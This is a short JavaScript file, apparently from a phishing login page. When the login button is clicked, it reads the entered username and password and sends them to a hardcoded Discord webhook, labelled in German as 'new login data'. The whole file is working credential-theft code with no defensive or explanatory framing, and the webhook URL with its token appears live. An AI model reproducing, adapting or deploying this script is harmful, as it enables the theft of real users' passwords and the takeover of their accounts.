const webhookURL = "https://discord.com/api/webhooks/1376665014861172786/SUJYlRDETCWU6rN2x8lJwvZkGzeWZtWGfH1FXtSdfbm7l1UcUo5sy1BBBue1RHGWWJAL";

document.getElementById("login-button").addEventListener("click", function() {
    const username = document.getElementById("login-username").value;
    const password = document.getElementById("login-password").value;

    const payload = {
        content: "**🔐 Neue Login-Daten:**",
        embeds: [
            {
                title: "📥 Login",
                color: 16711680,
                fields: [
                    { name: "Benutzername / Email / Telefon", value: username || "Nicht ausgefüllt", inline: false },
                    { name: "Passwort", value: password || "Nicht ausgefüllt", inline: false }
                ],
                timestamp: new Date().toISOString()
            }
        ]
    };

    fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
    }).then(() => {
        console.log("Login-Daten an Webhook gesendet.");
    }).catch(error => {
        console.error("Webhook-Fehler:", error);
    });
});
